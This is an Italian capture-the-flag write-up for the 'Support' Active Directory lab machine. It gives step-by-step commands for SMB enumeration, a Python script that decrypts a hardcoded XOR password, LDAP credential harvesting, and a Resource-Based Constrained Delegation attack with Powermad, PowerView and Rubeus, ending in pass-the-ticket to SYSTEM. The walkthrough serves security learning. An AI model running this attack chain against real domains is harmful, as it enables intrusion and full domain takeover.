+++
date = '2026-07-09T15:57:07+02:00'
draft = false
title = 'Support Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`09/06/2026`**

![Support.png](/images/imgs_support/Support.png)

---
# Introduzione

**_Support_** è un ambiente **Active Directory** di livello **Easy** (Non così facile, penso sia più un livello **Medium**, ma dipende dall'approccio che si utilizza). Introduce concetti base di **Reverse Engineering** affiancati ad attacchi avanzati di delega in **Active Directory**.

Il punto di accesso iniziale prevede l'enumerazione **SMB** anonima per trovare un tool eseguibile. Analizzando questo binario **`.NET`**, ne ho fatto il reverse engineering e ho crearo uno script per decriptare le credenziali di un account di servizio. Utilizzando queste credenziali, ho interrogato il dominio tramite **LDAP** per scoprire la password di un utente standard.

Per la privilege escalation, **BloodHound** ha rivelato che il gruppo dell'utente compromesso aveva diritti di **`GenericAll`** sul **Domain Controller** stesso. Ho abusato di questo privilegio per eseguire un attacco di **Resource-Based Constrained Delegation** (**RBCD**): ho creato un account macchina fittizio, l'ho delegato a impersonare l'**Administrator** sul **DC**, ho generato un **Kerberos Service Ticket** e ho infine ottenuto l'accesso come **SYSTEM**.

---
# Techniques Used

- **Reverse Engineering (.NET via ILSpy)**

- **Python Scripting per Decrittazione**

- **BloodHound Harvesting & Enumerazione**

- **Attaco Resource-Based Constrained Delegation (RBCD)**

- **Pass-The-Ticket**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- -Pn support
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49682/tcp open  unknown
49703/tcp open  unknown
49741/tcp open  unknown
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV -Pn support
```

```text
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-07-08 21:37:46Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17243/tcp): CLEAN (Timeout)
|   Check 2 (port 61212/tcp): CLEAN (Timeout)
|   Check 3 (port 26300/udp): CLEAN (Timeout)
|   Check 4 (port 28231/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 0s
| smb2-time: 
|   date: 2026-07-08T21:37:51
|_  start_date: N/A
```

**Porte Aperte**:

- **53**/tcp - DNS

- **88**/tcp - Kerberos

- **135**/tcp - MSRPC

- **139**/tcp - netbios-ssn

- **389**/tcp - LDAP

- **445**/tcp - microsoft-ds (SMB)

- **464**/tcp - kpasswd5

- **593**/tcp - ncacn_http

- **636**/tcp - ssl/ldap

- **3268**/tcp - LDAP Global Catalog

- **3269**/tcp - ssl/ldap Global Catalog

- **5985**/tcp - WinRM

- **9389**/tcp - ADWS

Ho aggiunto **`support.htb`** al mio file **`/etc/hosts`**.

## Enumerazione SMB 

Ho iniziato controllando l'accesso anonimo o Guest sul servizio **SMB** utilizzando **NetExec**:

```bash
nxc smb support.htb -u 'Guest' -p '' --shares
```

![smbanon.png](/images/imgs_support/smbanon.png)

L'output ha rivelato l'accesso a una share non di default chiamata **`support-tools`**. Mi sono connesso ad essa usando **smbclient**:

```bash
smbclient \\\\support.htb\\support-tools -U Guest
```

All'interno ho trovato alcuni tool standard di Sysinternals, ma non era un tool noto: **`UserInfo.exe.zip`**.

L'ho scaricato sulla mia macchina locale e l'ho estratto.

![smbclient.png](/images/imgs_support/smbclient.png)

---
# Accesso Iniziale | Reverse Engineering & Decrittazione Custom

Di solito, in questi casi, passo l'eseguibile sulla mia **Windows Commando VM**, lo eseguo e ne analizzo il comportamento dinamicamente. Tuttavia, avendo già utilizzato quel metodo la prima volta che ho pwnato la macchina, ho optato per un approccio di **analisi statica** utilizzando **[ILSpy](https://github.com/icsharpcode/ILSpy)** (un famoso decompiler e assembly browser open-source per **`.NET`**).

Aprendo **`UserInfo.exe`** in **ILSpy**, ho subito notato che il binario era progettato per connettersi a un server **LDAP** remoto (**`support.htb`**).

![ldapquery.png](/images/imgs_support/ldapquery.png)

Esaminando il codice, ho trovato una classe chiamata **Protected** contenente una password crittografata in **base64** e il metodo esatto utilizzato per crittografarla:

![encrypted.png](/images/imgs_support/encrypted.png)

Analizzando il codice **C#**, ho notato che si trattava di una semplice operazione **XOR** che coinvolgeva la stringa decodificata dal **base64**, la stringa "**armando**" e il valore esadecimale **`0xDF`**.

Ho scritto un breve script in **Python** per replicare e invertire questa logica:

```python
import base64
from itertools import cycle

encrypted = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
chiave1 = b"armando" 
chiave2 = 0xDF

password = ""

for e, k in zip(encrypted, cycle(chiave1)):
        password += chr(e ^ k ^ chiave2)

print(password)
```

L'esecuzione dello script ha recuperato con successo la password in chiaro:

![decrypted.png](/images/imgs_support/decrypted.png)

---
# Enumerazione LDAP 

Con queste credenziali, ho eseguito un dump **LDAP** del dominio:

```bash
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"
```

![ldap.png](/images/imgs_support/ldap.png)

L'output prodotto era parecchio. Quindi, ho rilanciato il comando salvando l'output all'interno di **`out.txt`**:

```bash
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" > out.txt
```

L'ho dato in pasto a un'**IA** che ha rivelato una password nascosta per un altro utente:

![cleartext.png](/images/imgs_support/cleartext.png)

Ho validato le credenziali e utilizzato **Evil-WinRM** per accedere alla macchina bersaglio:

```bash
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

![userflag.png](/images/imgs_support/userflag.png)

Ho ottenuto con successo la **user flag** situata in **`C:\Users\support\Desktop`**.

---
# Privilege Escalation | Resource-Based Constrained Delegation (RBCD)

Una volta loggato, ho iniziato la mia enumerazione interna. Ho controllato il **nome del Domain Controller** utilizzando:

```bash
nltest /dsgetdc:support.htb
```

![dc.png](/images/imgs_support/dc.png)

e ho aggiunto **`dc.support.htb`** al mio file hosts.

Controllando i privilegi e i gruppi, ho notato che facevo parte di un gruppo non standard chiamato **`Shared Support Accounts`**.

![groups.png](/images/imgs_support/groups.png)

A questo punto, ho raccolto i dati utilizzando **BloodHound** per visualizzare i percorsi dei permessi:

```bash
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -ns 10.129.230.181 -d support.htb -c all --zip
```

Analizzando il grafico di **BloodHound** per il gruppo **`Shared Support Accounts`**, ho scoperto che aveva privilegi di **`GenericAll`** sull'oggetto **Domain Controller** (**`DC.SUPPORT.HTB`**).

![hound1.png](/images/imgs_support/hound1.png)

**Nota**: **_Avere **`GenericAll`** su un oggetto (incluso un **Domain Controller**) significa che possiamo modificarne gli attributi. Nello specifico, possiamo modificare l'attributo **`msDS-AllowedToActOnBehalfOfOtherIdentity`**. Questo è il cuore di un attacco di **Resource-Based Constrained Delegation** (**RBCD**). Modificando questo attributo, possiamo dire al **Domain Controller** che uno specifico account macchina è autorizzato a impersonare **QUALSIASI** utente (inclusi i **Domain Admins**) contro il **DC** stesso._

## Attacco RBCD 

![rbcd.png](/images/imgs_support/rbcd.png)

Per eseguire questo attacco, ho caricato **`PowerView.ps1`**, **`Powermad.ps1`** e **`Rubeus.exe`** nella mia sessione **WinRM** e ho seguito passo dopo passo la guida di exploitation integrata in **BloodHound**:

```powershell
upload PowerView.ps1
upload Powermad.ps1
upload Rubeus.exe
. .\PowerView.ps1
. .\Powermad.ps1
```

![dependencies.png](/images/imgs_support/dependencies.png)

- **Step 1**: Ho utilizzato **Powermad** per creare un nuovo finto **Account Macchina** chiamato **`stars$`** e ho impostato la sua password:

```powershell
New-MachineAccount -MachineAccount stars -Password $(ConvertTo-SecureString 'Stars1%' -AsPlainText -Force)
```

- **Step 2**: Ho recuperato l'**Object SID** del mio account macchina appena creato:

```powershell
$ComputerSid = Get-DomainComputer stars -Properties objectsid | Select -Expand objectsid

$ComputerSid
```

- **Step 3**: Utilizzando **PowerView**, ho costruito una stringa di security descriptor grezza che garantisce l'accesso al **SID** della mia macchina, l'ho convertita in byte e ho aggiornato l'attributo **`msDS-AllowedToActOnBehalfOfOtherIdentity`** del **Domain Controller**:

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

- **Step 4**: Ora che la delega era impostata, ho usato **Rubeus** per richiedere un **Service Ticket** per il servizio cifs sul **Domain Controller**, impersonando l'**administrator**:

```powershell
.\Rubeus.exe hash /password:Stars1%
# Copied the RC4_HMAC hash

.\Rubeus.exe s4u /user:stars$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/DC.SUPPORT.HTB /ptt
```

![attack.png](/images/imgs_support/attack.png)

![ticket.png](/images/imgs_support/ticket.png)

## Pass-The-Ticket

**Rubeus** ha iniettato con successo il ticket forgiato nella mia sessione corrente e lo ha anche stampato in formato **Base64**. Ho copiato il ticket in un file locale chiamato **`ticket.kirbi.b64`** (pulendo gli spazi iniziali).

L'ho decodificato in un file **`.kirbi`** binario:

```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

Successivamente, ho convertito il ticket **`.kirbi`** in un formato **`.ccache`** utilizzando **`ticketConverter.py`**:

```bash
impacket-ticketConverter.py ticket.kirbi administrator.ccache
```

![ticketconverted.png](/images/imgs_support/ticketconverted.png)

Ho esportato il ticket nella variabile d'ambiente:

```bash
export KRB5CCNAME=administrator.ccache
```

Infine, ho utilizzato **`psexec.py`** per autenticarmi al **Domain Controller** in modo silenzioso tramite **Kerberos**:

```bash
psexec.py -k -no-pass support.htb/administrator@dc.support.htb
```

![rootflag.png](/images/imgs_support/rootflag.png)

La **root flag** era in **`C:\Users\Administrator\Desktop\root.txt`**.

---
# Considerazioni Finali

**_Support_** è una macchina che costringe a uscire dalla propria comfort zone, fondendo l'analisi base del codice con uno degli attacchi **Active Directory** più eleganti.

Il punto di accesso iniziale è un ottimo promemoria del fatto che le credenziali hardcoded nei tool interni sono un enorme rischio per la sicurezza, e sapere come eseguire un'**analisi statica** di base sui binari **`.NET`** è una skill cruciale.
La fase di privilege escalation è un esempio di attacco di **Resource-Based Constrained Delegation** (**RBCD**). Capire come manipolare l'attributo **`msDS-AllowedToActOnBehalfOfOtherIdentity`** e concatenarlo con le estensioni **Kerberos S4U** fornisce conoscenza per scenari reali e certificazioni avanzate come il **CRTE** o l'**OSCP**.

**Fonti**:

- **ILSpy | https://github.com/icsharpcode/ILSpy**

- **PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1**

- **Powermad | https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1**

- **Rubeus | https://github.com/Flangvik/SharpCollection**
